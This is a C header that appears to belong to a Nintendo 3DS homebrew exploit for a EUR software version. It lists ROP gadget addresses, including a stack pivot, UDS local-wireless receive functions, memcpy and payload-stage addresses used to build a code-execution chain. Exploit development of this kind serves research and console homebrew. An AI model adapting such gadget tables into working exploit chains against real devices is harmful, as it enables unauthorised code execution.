#pragma once

// EUR rop-gadgets/addresses
#define ROP_EUR_POP_PC 0x00155558 // rop-nop
#define ROP_EUR_POP_R0PC 0x00155a14
#define ROP_EUR_POP_R1PC 0x002a1900
#define ROP_EUR_POP_R0R1R2R3R4PC 0x0018beac
#define ROP_EUR_POP_R1R2R3PC 0x00118974
#define ROP_EUR_POP_R1R2R3R4R5PC 0x0010b6ac
#define ROP_EUR_POP_R3PC 0x00109370
#define ROP_EUR_POP_LR_PC 0x00295030
#define ROP_EUR_MOV_R0SP_MOV_R0R0_ADD_SPSPC8_POP_R4PC 0x00235d04
#define ROP_EUR_MOV_R1R0_BX_LR 0x00241f4c
#define ROP_EUR_ADD_R0R0R1_BX_LR 0x001173f8
#define ROP_EUR_LDR_R0R1_POP_R4PC 0x0038dd40
#define ROP_EUR_STR_R0R1_POP_R4PC 0x00106d08
#define ROP_EUR_SUB_R0R1R0_BX_LR 0x0025b6e0

#define ROP_EUR_MOV_SP_R0_MOV_R0_R2_MOV_LR_R3_BX_R1 0x00155ae0 // stack pivot
#define ROP_EUR_ADD_SP_SP_R3_POP_PC 0x00155554

#define ROP_EUR_UDS_ATTACH 0x001D7B4C // uds_Attach, calls udsipc_Bind. (int* pEd, u16 srcNodeId, u8 subId, size_t recvSize)
#define ROP_EUR_UDS_RECVFROM 0x001D6B30 // (int* pEd, void* pRecvData, u32* pRecvedSize, u16* pSrcNodeId, u32 bufferSize, u32 flags)
#define ROP_EUR_GXLOW_FLUSHDATACACHE 0x00130734
#define ROP_EUR_GXLOW_SETTEXTURECOPY 0x001468b4
#define ROP_EUR_SVC_SLEEPTHREAD 0x00109738
#define ROP_EUR_MEMCPY 0x00277de4

#define ROP_EUR_ADDR_MEM 0x45BF04 // end of .data - used only by some SHA crypto code - so let's reuse it here :)
#define ROP_EUR_ADDR_ED ROP_EUR_ADDR_MEM+sizeof(u32)
#define ROP_EUR_ADDR_SIZE ROP_EUR_ADDR_ED+sizeof(u32)
#define ROP_EUR_ADDR_NODEID ROP_EUR_ADDR_SIZE+sizeof(u32)

#define ROP_EUR_CODEBIN_OFFSET 0x300000 // from end of APPLICATION region (0x400_0000 - (ROP_EUR_CODEBIN_PHYSADDR - 0x2000_0000)) basically

//#define ROP_EUR_CODEBIN_PHYSADDR 0x23D00000 // probably old3ds only? I don't have a new3ds :(

#define ROP_LINEARMEM_BUF 0x16830000
#define ROP_FIXUP_OFFSET 7
#define ROP_SIZEOF_DMA(val) ((sizeof(val) < 0x400) ? 0x400 : sizeof(val))


#define PAYLOAD_EUR_UDS_DISCONNECT 0x001d7330
#define PAYLOAD_EUR_UDS_FINALISE 0x001D8940
#define PAYLOAD_EUR_SRV_GETSERVICEHANDLE 0x00295b24
#define PAYLOAD_EUR_HANDLE_GSPGPU 0x00448CDC

#define CPP_EVAL(...)  CPP_EVAL1(CPP_EVAL1(CPP_EVAL1(__VA_ARGS__)))
#define CPP_EVAL1(...) CPP_EVAL2(CPP_EVAL2(CPP_EVAL2(__VA_ARGS__)))
#define CPP_EVAL2(...) CPP_EVAL3(CPP_EVAL3(CPP_EVAL3(__VA_ARGS__)))
#define CPP_EVAL3(...) CPP_EVAL4(CPP_EVAL4(CPP_EVAL4(__VA_ARGS__)))
#define CPP_EVAL4(...) CPP_EVAL5(CPP_EVAL5(CPP_EVAL5(__VA_ARGS__)))
#define CPP_EVAL5(...) CPP_EXPAND(CPP_EXPAND(CPP_EXPAND(__VA_ARGS__)))
#define CPP_EXPAND(...) __VA_ARGS__
#define CPP_STRINGIFY(x) CPP_STRINGIFY_IMPL(x)
#define CPP_STRINGIFY_IMPL(x) #x